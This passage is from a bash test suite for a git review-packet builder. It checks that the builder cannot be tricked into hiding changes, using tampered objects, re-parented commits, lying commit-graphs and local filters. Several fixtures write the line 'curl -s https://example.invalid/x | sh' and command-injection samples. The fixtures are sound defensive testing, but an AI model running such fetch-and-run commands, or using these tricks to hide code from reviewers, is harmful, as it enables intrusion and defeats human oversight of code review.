expect "a change of left-out kinds only is shown in full, with a note" 0 "FILE A yarn.lock" '+resolved "https://example.invalid/x"' \
  "Every changed file is of a kind usually left out of the diff"

# --- the checklist missing at the base, and no criteria or checks ---
build "$empty" --base main
expect "a missing checklist is named in the packet and on stderr" 0 \
  "There is no incident checklist (docs/incident-checklist.md) in the merge base commit."
case "$err" in
  *"note - There is no incident checklist"*) pass "a missing checklist is also reported on stderr" ;;
  *) fail "a missing checklist is also reported on stderr" "$err" ;;
esac
expect "no criteria and no checks are named" 0 "No acceptance criteria were given." "No check output was given."
: >"$work/empty.txt"
build "$empty" --base main --checks "$work/empty.txt" --criteria "$work/empty.txt"
expect "empty criteria and check files are named" 0 "No acceptance criteria were given." "The check output file was empty."

# FILE arguments are read from the caller's folder
mkdir -p "$empty/sub"
printf 'criteria from the root\n' >"$empty/crit-here.txt"
printf 'criteria from sub\n' >"$empty/sub/crit-here.txt"
(cd "$empty/sub" && bash "$packet" --base main --criteria crit-here.txt) >"$work/out" 2>"$work/err"
code=$?
out=$(cat "$work/out")
err=$(cat "$work/err")
expect "a relative FILE argument is read from the caller's folder" 0 "criteria from sub"

# --- submodules, also with ignore = all ---
subs=$(new_repo) || abort_sandbox
old_id=1111111111111111111111111111111111111111
new_id=2222222222222222222222222222222222222222
printf '[submodule "m"]\n\tpath = m\n\turl = ./elsewhere\n\tignore = all\n' >"$subs/.gitmodules"
printf 'vendored code\n' >"$subs/vendor"
(cd "$subs" && git add .gitmodules vendor && git update-index --add --cacheinfo "160000,$old_id,m" && git commit -qm base && mkdir m)
(cd "$subs" && git checkout -q -b task && git update-index --cacheinfo "160000,$new_id,m" &&
  git rm -q --cached vendor && rm -f vendor && mkdir vendor && git update-index --add --cacheinfo "160000,$new_id,vendor" && git commit -qm "bump")
build "$subs" --base main
expect "a submodule move shows, even with ignore = all" 0 "M m (submodule)" "submodule m: $old_id -> $new_id"
expect "a file replaced by a submodule shows the file's removal" 0 "T vendor (submodule; mode 100644 -> 160000)" "-vendored code" \
  "submodule vendor: none -> $new_id"
(cd "$subs" && git update-index --cacheinfo "160000,3333333333333333333333333333333333333333,m")
build "$subs" --base main
expect "a staged submodule move is refused, even with ignore = all" 1 "commit first"
(cd "$subs" && git update-index --cacheinfo "160000,$new_id,m")

# a checked-out submodule with its own edits does not block the packet: they
# are not part of the change
inner=$(new_repo) || abort_sandbox
printf 'inner\n' >"$inner/inner.txt"
commit "$inner" "inner"
outer=$(new_repo) || abort_sandbox
printf 'outer\n' >"$outer/outer.txt"
(cd "$outer" && git add outer.txt && git -c protocol.file.allow=always submodule add -q "$inner" sm >/dev/null 2>&1 && git commit -qm base)
(cd "$outer" && git checkout -q -b task && printf 'more\n' >>outer.txt && git commit -qam change && printf 'edited\n' >>sm/inner.txt)
if [ -f "$outer/sm/inner.txt" ]; then
  build "$outer" --base main
  expect "an edit inside a checked-out submodule does not block the packet" 0 "FILE M outer.txt"
else
  skip "a checked-out submodule: git could not add one here"
fi
drop_sandbox "$inner"
drop_sandbox "$outer"

# --- a missing object is an error, never an empty answer ---
broken=$(new_repo) || abort_sandbox
printf 'base\n' >"$broken/a.txt"
commit "$broken" "base"
(cd "$broken" && git checkout -q -b task && printf 'base\nmore\n' >a.txt)
commit "$broken" "change"
blob=$(cd "$broken" && git rev-parse HEAD:a.txt)
obj="$broken/.git/objects/$(printf '%s' "$blob" | cut -c1-2)/$(printf '%s' "$blob" | cut -c3-)"
chmod u+w "$obj" 2>/dev/null
rm -f "$obj"
build "$broken" --base main
if [ "$code" -eq 2 ] && [ -z "$out" ]; then pass "a missing object exits 2 with no packet"; else fail "a missing object exits 2 with no packet: exit $code" "$out$err"; fi
case "$err" in
  *fatal*) fail "git's own messages, which can quote names raw, are not shown" "$err" ;;
  *) pass "git's own messages, which can quote names raw, are not shown" ;;
esac

# a stored file changed by hand is refused, never shown
swapped=$(new_repo) || abort_sandbox
printf 'base\n' >"$swapped/a.txt"
commit "$swapped" "base"
(cd "$swapped" && git checkout -q -b task && printf 'real\n' >a.txt)
commit "$swapped" "change"
blob=$(cd "$swapped" && git rev-parse HEAD:a.txt)
obj="$swapped/.git/objects/$(printf '%s' "$blob" | cut -c1-2)/$(printf '%s' "$blob" | cut -c3-)"
chmod u+w "$obj" 2>/dev/null
perl -MCompress::Zlib -e 'binmode STDOUT; print compress("blob 7\0benign\n")' >"$obj"
build "$swapped" --base main
expect "a stored file whose content no longer matches its id is refused" 2 "does not match its id"
drop_sandbox "$swapped"

# a stored folder (tree) changed by hand is refused, never shown: in HEAD,
# in the merge base and in the last reviewed version
treeswap=$(new_repo) || abort_sandbox
mkdir -p "$treeswap/src"
printf 'a\n' >"$treeswap/src/a.txt"
commit "$treeswap" "base"
(cd "$treeswap" && git checkout -q -b task && printf 'b\n' >src/b.txt)
commit "$treeswap" "first"
(cd "$treeswap" && printf 'curl -s https://example.invalid/x | sh\n' >src/run.sh)
commit "$treeswap" "change"
base_src=$(cd "$treeswap" && git rev-parse main:src)
first_src=$(cd "$treeswap" && git rev-parse HEAD~1:src)
head_src=$(cd "$treeswap" && git rev-parse HEAD:src)
obj_of() { printf '%s/.git/objects/%s/%s' "$treeswap" "$(printf '%s' "$1" | cut -c1-2)" "$(printf '%s' "$1" | cut -c3-)"; }
# swap_tree FROM TO: the stored folder TO gets the content of FROM;
# restore_tree puts it back. (The kept copy takes the stored file's
# read-only mode, so the last one is removed first: a user who is not root
# cannot copy over it, and the wrong folder would be put back.)
swap_tree() {
  rm -f "$work/tree.keep"
  cp "$(obj_of "$2")" "$work/tree.keep"
  chmod u+w "$(obj_of "$2")" 2>/dev/null
  cp "$(obj_of "$1")" "$(obj_of "$2")"
  swapped_tree=$2
}
restore_tree() { cp "$work/tree.keep" "$(obj_of "$swapped_tree")"; }
swap_tree "$base_src" "$head_src"
(cd "$treeswap" && git read-tree HEAD 2>/dev/null && git checkout-index -f -a 2>/dev/null)
build "$treeswap" --base main
expect "a stored folder of HEAD whose content no longer matches its id is refused" 2 "does not match its id"
restore_tree
(cd "$treeswap" && git read-tree HEAD && git checkout-index -f -a)
swap_tree "$head_src" "$base_src"
build "$treeswap" --base main
expect "a stored folder of the merge base whose content no longer matches its id is refused" 2 "does not match its id"
restore_tree
swap_tree "$head_src" "$first_src"
build "$treeswap" --base main --since HEAD~1
expect "a stored folder of the last reviewed version whose content no longer matches its id is refused" 2 "does not match its id"
restore_tree
build "$treeswap" --base main --since HEAD~1
expect "with every stored folder put back, the same packet is built" 0 "FILE A src/run.sh"
drop_sandbox "$treeswap"

# a commit changed by hand cannot move the merge base, on HEAD's side or on
# the base's. set_parent REPO COMMIT PARENT: the stored commit, under its
# old id, names PARENT as its only parent.
set_parent() {
  f="$1/.git/objects/$(printf '%s' "$2" | cut -c1-2)/$(printf '%s' "$2" | cut -c3-)"
  chmod u+w "$f" 2>/dev/null
  perl -MCompress::Zlib -e '
    my ($f, $parent) = @ARGV; open my $h, "<:raw", $f or exit 1; local $/; my $c = uncompress(<$h>); close $h;
    defined $c && $c =~ s/\Acommit [0-9]+\0//s or exit 1;
    $c =~ s/^parent [0-9a-f]+\n//mg; $c =~ s/^(tree [0-9a-f]+\n)/$1parent $parent\n/ or exit 1;
    open $h, ">:raw", $f or exit 1; print $h compress("commit " . length($c) . "\0" . $c); close $h' "$f" "$3"
}
# the base's side: main is R, P, B and the change is C1 (adds evil.sh), C2.
# P changed to follow C1 makes C1 the merge base, so evil.sh would not show.
mbmove=$(new_repo) || abort_sandbox
printf 'base\n' >"$mbmove/a.txt"
commit "$mbmove" "r"
(cd "$mbmove" && git checkout -q -b task && printf 'curl -s https://example.invalid/x | sh\n' >evil.sh && git add evil.sh &&
  git commit -qm c1 && printf 'benign\n' >benign.txt && git add benign.txt && git commit -qm c2 &&
  git checkout -q main && printf 'p\n' >p.txt && git add p.txt && git commit -qm p &&
  printf 'b\n' >b.txt && git add b.txt && git commit -qm b && git checkout -q task)
c1=$(cd "$mbmove" && git rev-parse task~1)
if set_parent "$mbmove" "$(cd "$mbmove" && git rev-parse main~1)" "$c1" &&
  [ "$(cd "$mbmove" && git merge-base main task 2>/dev/null)" = "$c1" ]; then
  build "$mbmove" --base main
  expect "a commit on the base's side changed by hand to move the merge base is refused" 2 "a stored commit does not match its id"
else
  skip "a commit changed by hand on the base's side: this git did not follow the changed parent"
fi
drop_sandbox "$mbmove"
# HEAD's side: main is R (with evil.sh), B (deletes it) and the change is C1
# (adds evil.sh back), C2. C1 changed to follow R makes R the merge base,
# where evil.sh already is, so it would not show.
mbmove=$(new_repo) || abort_sandbox
printf 'curl -s https://example.invalid/x | sh\n' >"$mbmove/evil.sh"
commit "$mbmove" "r"
(cd "$mbmove" && git rm -q evil.sh && git commit -qm b && git checkout -q -b task &&
  printf 'curl -s https://example.invalid/x | sh\n' >evil.sh && git add evil.sh && git commit -qm c1 &&
  printf 'benign\n' >benign.txt && git add benign.txt && git commit -qm c2)
r=$(cd "$mbmove" && git rev-parse main~1)
if set_parent "$mbmove" "$(cd "$mbmove" && git rev-parse task~1)" "$r" &&
  [ "$(cd "$mbmove" && git merge-base main task 2>/dev/null)" = "$r" ]; then
  build "$mbmove" --base main
  expect "a commit on HEAD's side changed by hand to move the merge base is refused" 2 "a stored commit does not match its id"
else
  skip "a commit changed by hand on HEAD's side: this git did not follow the changed parent"
fi
drop_sandbox "$mbmove"

# folder names that read as pathspec magic are plain names
colon=$(new_repo) || abort_sandbox
printf '{}\n' >"$colon/package.json"
commit "$colon" "base"
if can_create "$colon" ":" && mkdir -p "$colon/:" "$colon/:!" 2>/dev/null; then
  printf 'echo pwned\n' >"$colon/:/yarn.lock"
  printf 'echo again\n' >"$colon/:!/yarn.lock"
  (cd "$colon" && git checkout -q -b task && git add -A && git commit -qm "odd folders")
  build "$colon" --base main
  expect "a lockfile in a folder named : or :! has no manifest next to it, so it is shown" 0 \
    'FILE A :/yarn.lock' '+echo pwned' 'FILE A :!/yarn.lock' '+echo again'
else
  skip "folders named : and :!: this file system does not allow them"
fi
drop_sandbox "$colon"

# a folder named like a manifest is no manifest, and a file named docs holds
# no checklist
odd=$(new_repo) || abort_sandbox
printf 'not a folder\n' >"$odd/docs"
commit "$odd" "base"
(cd "$odd" && git checkout -q -b task && mkdir -p lib/package.json && printf 'keep\n' >lib/package.json/keep &&
  printf 'echo evil\n' >lib/yarn.lock)
commit "$odd" "change"
build "$odd" --base main
expect "a lockfile next to a folder named like its manifest is shown" 0 'FILE A lib/yarn.lock' '+echo evil'
expect "a file named docs at the merge base means there is no checklist" 0 "There is no incident checklist"
drop_sandbox "$odd"

# git's working copy must be the folder the packet is built from
wt=$(new_repo) || abort_sandbox
printf 'def sanitize(s): return s\n' >"$wt/utils.py"
commit "$wt" "base"
(cd "$wt" && git checkout -q -b task && printf 'os.system("ls " + sanitize(x))\n' >app.py && git add app.py && git commit -qm change &&
  git worktree add --detach "$work/wt-clean" HEAD >/dev/null 2>&1 && printf 'import shlex\n' >utils.py)
if [ -e "$work/wt-clean/.git" ]; then
  (cd "$wt" && git config core.worktree "$work/wt-clean")
  build "$wt" --base main
  expect "a core.worktree setting that points git at a clean copy elsewhere is refused" 1 "is not the folder the packet is built from"
  (cd "$wt" && git config --unset core.worktree)
  (cd "$wt" && GIT_DIR="$wt/.git" GIT_WORK_TREE="$work/wt-clean" bash "$packet" --base main) >"$work/out" 2>"$work/err"
  code=$?
  out=$(cat "$work/out")
  err=$(cat "$work/err")
  expect "GIT_DIR and GIT_WORK_TREE are ignored, so git looks at this folder and sees its edit" 1 "commit first"
else
  skip "a working copy elsewhere: git worktree is not available here"
fi
drop_sandbox "$wt"

# a repository with SHA-256 ids: stored files and folders are checked in
# that hash
sha=$(new_sandbox_dir) || abort_sandbox
if (cd "$sha" && git init -q --object-format=sha256) 2>/dev/null; then
  (cd "$sha" && git symbolic-ref HEAD refs/heads/main && git config user.name Test && git config user.email test@example.invalid &&
    git config commit.gpgsign false && mkdir -p src && printf 'base\n' >src/a.txt && git add -A && git commit -qm base &&
    git checkout -q -b task && printf 'changed\n' >src/a.txt && git commit -qam change)
  build "$sha" --base main
  expect "a repository with SHA-256 ids gives a packet" 0 "FILE M src/a.txt" "+changed"
  tree_follows_head "a repository with SHA-256 ids: the header names HEAD's whole 64-digit tree id" "$sha"
else
  skip "SHA-256 ids: this git cannot make such a repository"
fi
drop_sandbox "$sha"

# a commit-graph file that lies about HEAD's tree changes nothing
graph=$(new_repo) || abort_sandbox
printf 'base\n' >"$graph/a.txt"
commit "$graph" "base"
(cd "$graph" && git checkout -q -b decoy && printf 'benign\n' >b.txt && git add b.txt && git commit -qm decoy &&
  git checkout -q -b task main && printf 'real change\n' >b.txt && git add b.txt && git commit -qm change &&
  git commit-graph write --reachable >/dev/null 2>&1)
real_tree=$(cd "$graph" && git rev-parse 'task^{tree}')
decoy_tree=$(cd "$graph" && git rev-parse 'decoy^{tree}')
# patch_graph REPO FROM TO: the repo's commit-graph file names tree TO where
# it named tree FROM; fails when there is no such file or FROM is not in it once
patch_graph() {
  [ -f "$1/.git/objects/info/commit-graph" ] && perl -e '
    my ($f, $from, $to) = @ARGV; open my $h, "<:raw", $f or exit 1; local $/; my $t = <$h>; close $h;
    my ($a, $b) = (pack("H*", $from), pack("H*", $to)); my $n = () = $t =~ /\Q$a\E/g; exit 1 unless $n == 1;
    $t =~ s/\Q$a\E/$b/; chmod 0644, $f; open $h, ">:raw", $f or exit 1; print $h $t; close $h' "$1/.git/objects/info/commit-graph" "$2" "$3"
}
if patch_graph "$graph" "$real_tree" "$decoy_tree"; then
  (cd "$graph" && git read-tree "$decoy_tree" && git checkout-index -f -a)
  build "$graph" --base main
  if [ "$code" -ne 0 ] && [ -z "$out" ]; then
    pass "a commit-graph that lies about HEAD's tree does not give a packet of the decoy"
  else
    fail "a commit-graph that lies about HEAD's tree does not give a packet of the decoy: exit $code" "$out"
  fi
else
  skip "a lying commit-graph: git wrote no commit-graph here"
fi
drop_sandbox "$graph"
graph=$(new_repo) || abort_sandbox
printf 'base\n' >"$graph/a.txt"
commit "$graph" "base"
(cd "$graph" && git checkout -q -b task && printf 'real change\n' >b.txt && git add b.txt && git commit -qm change &&
  git commit-graph write --reachable >/dev/null 2>&1)
if patch_graph "$graph" "$(cd "$graph" && git rev-parse 'main^{tree}')" "$(cd "$graph" && git rev-parse 'task^{tree}')"; then
  build "$graph" --base main
  expect "a commit-graph that lies about the merge base's tree hides nothing" 0 'FILE A b.txt' '+real change'
else
  skip "a commit-graph that lies about the merge base: git wrote no commit-graph here"
fi
drop_sandbox "$graph"

# two merge bases (criss-cross merges) are named, in doubt
cross=$(new_repo) || abort_sandbox
printf 'base\n' >"$cross/base.txt"
commit "$cross" "base"
(cd "$cross" && git checkout -q -b x && printf 'x\n' >x.txt && git add x.txt && git commit -qm x1 &&
  git checkout -q -b y main && printf 'y\n' >y.txt && git add y.txt && git commit -qm y1 &&
  git checkout -q x && git merge -q --no-edit y >/dev/null && git checkout -q y && git merge -q --no-edit x~1 >/dev/null &&
  git checkout -q x && printf 'more\n' >more.txt && git add more.txt && git commit -qm more)
build "$cross" --base y
expect "two merge bases are named in the header, in doubt" 0 "In doubt: HEAD and the base have 2 merge bases"
drop_sandbox "$cross"

# a checklist that the change adds, and one that is not a regular file
adds=$(new_repo) || abort_sandbox
printf 'base\n' >"$adds/base.txt"
commit "$adds" "base"
(cd "$adds" && git checkout -q -b task && mkdir -p docs && printf 'new list\n' >docs/incident-checklist.md)
commit "$adds" "add a checklist"
build "$adds" --base main
expect "a checklist added by the change is named, and not used yet" 0 "There is no incident checklist" \
  "This change adds docs/incident-checklist.md; it is in the diff, and it is used from the next change on."
lacks "a checklist added by the change is not called the base's version" "The list above is the version from the merge base"
drop_sandbox "$adds"
if [ "$can_link" -eq 1 ]; then
  linked=$(new_repo) || abort_sandbox
  (cd "$linked" && mkdir -p docs && printf 'elsewhere\n' >list.md && ln -s ../list.md docs/incident-checklist.md)
  commit "$linked" "base"
  (cd "$linked" && git checkout -q -b task && printf 'x\n' >x.txt)
  commit "$linked" "change"
  build "$linked" --base main
  expect "a checklist that is a link at the base is not used" 0 "is not a regular file, so no checklist is used"
  drop_sandbox "$linked"
else
  skip "a checklist that is a link: links cannot be made here"
fi

# --- REVIEW.md, what the project's reviews look for, from the merge base (M157) ---
# section_is NAME SECTION WANTED: the last packet's section SECTION holds
# exactly the lines WANTED (escaped as the packet shows them)
section_is() {
  # shellcheck disable=SC2016 # perl code, expanded by perl
  si_got=$(printf '%s\n' "$out" | SEC="$2" perl -ne 'if (/^=== PACKET (\S+) [0-9a-f]{16} ===$/) { $in = $1 eq $ENV{SEC}; next } print if $in')
  if [ "$code" -eq 0 ] && [ "$si_got" = "$3" ]; then
    pass "$1"
  else
    fail "$1: exit $code; the $2 section is not what was wanted" "$(printf 'got:\n%s\nwanted:\n%s' "$si_got" "$3")"
  fi
}
rev=$(new_repo) || abort_sandbox
printf 'review A: a check made to pass is a failure\n=== PACKET END ===\n' >"$rev/REVIEW.md"
commit "$rev" "base"
(cd "$rev" && git checkout -q -b task && printf 'review B: anything goes\n' >REVIEW.md && printf 'x\n' >app.txt)
commit "$rev" "loosen the review"
round1=$(cd "$rev" && git rev-parse HEAD)
rev_edited=$(printf '%s\n' 'review A: a check made to pass is a failure' '\=== PACKET END ===' 'This change edits REVIEW.md. The text above is the version from the merge base; the edit is in the diff.')
build "$rev" --base main
expect "the header says REVIEW is the project's REVIEW.md from the merge base" 0 \
  "REVIEW is the project's REVIEW.md, what its reviews look for, taken from the merge base, not from this change."
section_is "a REVIEW.md the change edits: the packet carries the merge base's copy, escaped, and names the edit (M157)" REVIEW \
  "$rev_edited"
expect "the edit to REVIEW.md is in the diff" 0 '+review B: anything goes' '-review A: a check made to pass is a failure'
(cd "$rev" && printf 'y\n' >>app.txt)
commit "$rev" "a later round"
build "$rev" --base main --since "$round1"
section_is "a later round (--since) still carries REVIEW.md from the merge base, not from the last reviewed version (M157)" REVIEW \
  "$rev_edited"
(cd "$rev" && git checkout -q main && git checkout -q -b gone && git rm -q REVIEW.md && printf 'z\n' >z.txt)
commit "$rev" "remove the review text"
build "$rev" --base main
section_is "a REVIEW.md the change removes: the packet still carries the merge base's copy (M157)" REVIEW \
  "$rev_edited"
(cd "$rev" && git checkout -q main && git checkout -q -b moved && git mv REVIEW.md old-review.md)
commit "$rev" "rename the review text away"
build "$rev" --base main
section_is "a REVIEW.md the change renames away: the packet carries the merge base's copy and names the edit (M157)" REVIEW \
  "$rev_edited"
(cd "$rev" && git checkout -q main && printf 'review C: main changed this after the branch\n' >REVIEW.md)
commit "$rev" "main changes the review text later"
(cd "$rev" && git checkout -q moved)
build "$rev" --base main
section_is "main changes REVIEW.md after the branch point: the packet carries the merge base's copy, not main's tip (M157)" REVIEW \
  "$rev_edited"
drop_sandbox "$rev"
revadd=$(new_repo) || abort_sandbox
printf 'base\n' >"$revadd/base.txt"
commit "$revadd" "base"
(cd "$revadd" && git checkout -q -b task && printf 'new review text\n' >REVIEW.md)
commit "$revadd" "add REVIEW.md"
build "$revadd" --base main
rev_added=$(printf '%s\n' 'There is no REVIEW.md in the merge base commit.' 'This change adds REVIEW.md; it is in the diff, and it is used from the next change on.')
section_is "a REVIEW.md the change adds is named, and not used yet (M157)" REVIEW \
  "$rev_added"
case "$err" in
  *"note - There is no REVIEW.md in the merge base commit."*) pass "a missing REVIEW.md is also reported on stderr" ;;
  *) fail "a missing REVIEW.md is also reported on stderr" "$err" ;;
esac
drop_sandbox "$revadd"
if [ "$can_link" -eq 1 ]; then
  revlink=$(new_repo) || abort_sandbox
  (cd "$revlink" && printf 'elsewhere\n' >other.md && ln -s other.md REVIEW.md)
  commit "$revlink" "base"
  (cd "$revlink" && git checkout -q -b task && printf 'x\n' >x.txt)
  commit "$revlink" "change"
  build "$revlink" --base main
  section_is "a REVIEW.md that is a link at the base is not used" REVIEW \
    "REVIEW.md in the merge base commit is not a regular file, so no REVIEW.md is used."
  drop_sandbox "$revlink"
else
  skip "a REVIEW.md that is a link: links cannot be made here"
fi

# line endings: CRLF stored under text=auto, autocrlf=true, and filters
eol=$(new_repo) || abort_sandbox
printf 'old\r\nlines\r\n' >"$eol/legacy.txt"
printf 'plain\n' >"$eol/plain.txt"
printf 'secret code\n' >"$eol/hidden.txt"
commit "$eol" "base"
(cd "$eol" && printf '* text=auto\n' >.gitattributes && git add .gitattributes && git commit -qm attrs &&
  git checkout -q -b task && printf 'old\r\nlines\r\nmore\r\n' >legacy.txt && printf 'plain\nmore\n' >plain.txt &&
  printf 'evil code\n' >hidden.txt && git add -A && git commit -qm change)
stored=$(cd "$eol" && git cat-file blob HEAD:legacy.txt | od -An -c | tr -d ' \n')
case "$stored" in
  *'\r\n'*)
    build "$eol" --base main
    expect "a clean file stored with CRLF under text=auto is not refused" 0 "FILE M legacy.txt"
    ;;
  *) skip "a file stored with CRLF under text=auto: git normalised it here" ;;
esac
(cd "$eol" && git config core.autocrlf true && rm -f plain.txt && git checkout -q -- plain.txt)
case "$(od -An -c "$eol/plain.txt" | tr -d ' \n')" in
  *'\r\n'*) ;;
  *) fail "the autocrlf test did not get a CRLF working copy" ;;
esac
build "$eol" --base main
expect "a clean CRLF working copy under core.autocrlf=true is not refused" 0 "FILE M plain.txt"
printf 'plain\r\nmore\n' >"$eol/plain.txt"
(cd "$eol" && git add plain.txt)
if [ -z "$(cd "$eol" && git status --porcelain --untracked-files=no)" ]; then
  build "$eol" --base main
  expect "a file that differs from the commit only by CRs, which core.autocrlf makes look committed, is named in the header" 0 \
    "On disk, 1 tracked files differ from the commit only by a CR before some or all line ends" "set -e off in a shell script): plain.txt"
else
  skip "a CR added to one line under core.autocrlf: git status sees the edit here"
fi
(cd "$eol" && git config core.autocrlf false && rm -f plain.txt && git checkout -q -- plain.txt)
(cd "$eol" && printf '* text=auto\nrun.bat text eol=crlf\n' >.gitattributes && printf '@echo off\necho more\n' >run.bat && git add -A 2>/dev/null &&
  git commit -qm bat && rm -f run.bat && git checkout -q -- run.bat 2>/dev/null)
build "$eol" --base main
expect "a CRLF the commit's own .gitattributes asks for is the commit, so it is not refused" 0 "FILE A run.bat"
case "$out" in
  *"differ from the commit only by a CR"*) fail "and it is not named as a CR difference" "$out" ;;
  *) pass "and it is not named as a CR difference" ;;
esac
printf '@echo off\r\necho more\n' >"$eol/run.bat"
(cd "$eol" && git update-index -q --refresh 2>/dev/null)
build "$eol" --base main
expect "a file that lacks a CR the commit's eol=crlf rule asks for is refused: it is an edit, and git status sees it" 1 \
  "tracked files have uncommitted or staged changes"
(cd "$eol" && git add run.bat)
if [ -z "$(cd "$eol" && git status --porcelain --untracked-files=no)" ]; then
  pass "setup: once the file is added, git status shows nothing"
else
  fail "setup: once the file is added, git status shows nothing" "$(cd "$eol" && git status --porcelain --untracked-files=no)"
fi
build "$eol" --base main
expect "once it is added it is still refused, with its own reason and a fix that works" 1 \
  "the working copy of run.bat lacks a CR before some line ends that its commit's .gitattributes asks for" \
  "delete it and check it out again (rm FILE && git checkout -- FILE)"
(cd "$eol" && rm -f run.bat && git checkout -q -- run.bat)
build "$eol" --base main
expect "following that fix builds the packet again" 0 "FILE A run.bat"
# shellcheck disable=SC2016 # $1 is for the script being written
printf '#!/bin/sh\ncat >/dev/null\ngit cat-file blob "HEAD:$1"\n' >"$eol/.git/clean-hide.sh"
# shellcheck disable=SC2016 # $Id$ is meant literally
(cd "$eol" && printf 'var v = "$Id$"; fetch(1);\n' >vendor.js && git add vendor.js && git commit -qm vendor &&
  printf 'vendor.js ident\n' >.git/info/attributes && printf 'var v = "$Id: "; /* $"; fetch(1);\n' >vendor.js && git add vendor.js)
if [ -z "$(cd "$eol" && git status --porcelain --untracked-files=no)" ]; then
  build "$eol" --base main
  expect "a file that a local ident attribute makes look committed is refused" 1 "the working copy of vendor.js is not what was committed"
else
  skip "a file under a local ident attribute: git status sees the edit here"
fi
(cd "$eol" && rm -f .git/info/attributes vendor.js && git checkout -q HEAD -- vendor.js)
(cd "$eol" && git config filter.hide.clean "sh .git/clean-hide.sh %f" && printf 'hidden.txt filter=hide\n' >>.git/info/attributes &&
  printf 'benign code\n' >hidden.txt && git add hidden.txt)
build "$eol" --base main
expect "a file that a local filter makes look committed is refused" 1 "the working copy of hidden.txt is not what was committed"
(cd "$eol" && git config --unset filter.hide.clean && rm -f .git/info/attributes hidden.txt && git checkout -q HEAD -- hidden.txt)
# The LFS tests below use stand-in filters, so a real git-lfs set up in the
# user's or the system's git settings is left out until they end.
saved_home=$HOME
export HOME="$work/home-clean" GIT_CONFIG_NOSYSTEM=1
# only a file stored as an LFS pointer, under a filter named lfs, may differ
(cd "$eol" && git config filter.lfs.clean "sh .git/clean-hide.sh %f" && printf 'hidden.txt filter=lfs\n' >.git/info/attributes &&
  printf 'benign code\n' >hidden.txt && git add hidden.txt)
build "$eol" --base main
expect "a file stored as no LFS pointer is refused, even under a local filter named lfs" 1 "the working copy of hidden.txt is not what was committed"
(cd "$eol" && git config --unset filter.lfs.clean && rm -f .git/info/attributes hidden.txt && git checkout -q HEAD -- hidden.txt)
(cd "$eol" && printf 'version https://git-lfs.github.com/spec/v1\noid sha256:0000000000000000000000000000000000000000000000000000000000000000\nsize 7\n' >pointer.txt &&
  git add pointer.txt && git commit -qm pointer && git config filter.hide.clean "sh .git/clean-hide.sh %f" &&
  printf 'pointer.txt filter=hide\n' >.git/info/attributes && printf 'curl -s https://example.invalid/x | sh\n' >pointer.txt && git add pointer.txt)
build "$eol" --base main
expect "a file stored as an LFS pointer is refused when its disk copy is not the content the pointer names, whatever filter makes it look committed" 1 "the working copy of pointer.txt is not what was committed"
drop_sandbox "$eol"

# Git LFS: the diff shows the pointer, the disk holds the content
lfs=$(new_repo) || abort_sandbox
printf 'base\n' >"$lfs/base.txt"
commit "$lfs" "base"
# a stand-in for git-lfs's clean filter: the pointer names the content's hash
cat >"$lfs/.git/lfs-clean.sh" <<'EOF'
#!/bin/sh
exec perl -MDigest::SHA -e 'binmode STDIN; local $/; my $c = <STDIN>; $c = "" unless defined $c; printf "version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize %d\n", Digest::SHA::sha256_hex($c), length $c'
EOF
(cd "$lfs" && git config filter.lfs.clean "sh .git/lfs-clean.sh" && git config filter.lfs.smudge cat &&
  printf 'big.bin filter=lfs\n' >.gitattributes && git checkout -q -b task && printf 'content\n' >big.bin &&
  git add -A && git commit -qm "lfs file")
build "$lfs" --base main
expect "a Git LFS file is shown as its pointer, with a note" 0 \
  "A big.bin (stored in Git LFS: the diff shows the pointer, and the file on disk is the content)" "+version https://git-lfs.github.com/spec/v1"
(cd "$lfs" && git update-index --assume-unchanged big.bin && printf 'swapped\n' >big.bin)
build "$lfs" --base main
expect "a Git LFS file whose disk copy is not the stored content is refused" 1 "the working copy of big.bin is not what was committed"
drop_sandbox "$lfs"

# a change of many files lists every file: 600 long names make about 150 KB
# of paths, over the 128 KB limit a small stack gives on Linux, so no
# command line may hold them all
many=$(new_repo) || abort_sandbox
printf 'base\n' >"$many/base.txt"
commit "$many" "base"
(cd "$many" && git checkout -q -b task && mkdir -p d && perl -e 'my $n = "n" x 230; for (1 .. 600) { open my $f, ">", sprintf("d/%s-%03d.txt", $n, $_) or die; print $f "n $_\n" }')
commit "$many" "many files"
if (ulimit -s 256) 2>/dev/null; then
  (cd "$many" && ulimit -s 256 && bash "$packet" --base main) >"$work/out" 2>"$work/err"
  code=$?
  out=$(cat "$work/out")
  err=$(cat "$work/err")
  files_listed=$(printf '%s\n' "$out" | grep -c '^A d/nnn')
  if [ "$code" -eq 0 ] && [ "$files_listed" -eq 600 ]; then
    pass "a change of 600 long file names lists every file under a small stack limit"
  else
    fail "a change of 600 long file names lists every file under a small stack limit: exit $code, $files_listed listed" "$err"
  fi
else
  skip "many long file names: the stack limit cannot be lowered here"
fi
drop_sandbox "$many"
export HOME="$saved_home"
unset GIT_CONFIG_NOSYSTEM

for d in "$std" "$rounds" "$empty" "$subs" "$broken" "$work"; do drop_sandbox "$d"; done
echo "tests: review packet: $tests_pass passed, $tests_fail failed, $tests_skip skipped"
[ "$tests_fail" -eq 0 ]
